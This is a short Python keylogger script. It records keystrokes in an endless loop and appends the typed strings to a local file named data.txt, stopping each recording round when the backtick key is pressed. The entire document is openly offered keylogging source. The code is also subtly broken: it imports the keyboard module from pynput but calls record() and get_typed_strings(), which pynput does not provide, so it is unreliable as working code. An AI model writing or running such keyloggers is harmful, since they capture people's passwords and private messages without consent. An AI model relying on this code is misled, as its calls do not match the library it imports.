from pynput import keyboard

# path to logging file, can be changed depending on which file keystrokes should be stored in
path = "data.txt"

while True:
    with open(path, 'a') as data_file:
        # continues logging keys until "`" is pressed
        events = keyboard.record('`')

        # can extract typed strings from sequence of keyboard events, easy readability
        typed = list(keyboard.get_typed_strings(events))

        # writes keystrokes into logging file
        data_file.write('\n')
        data_file.write(typed[0])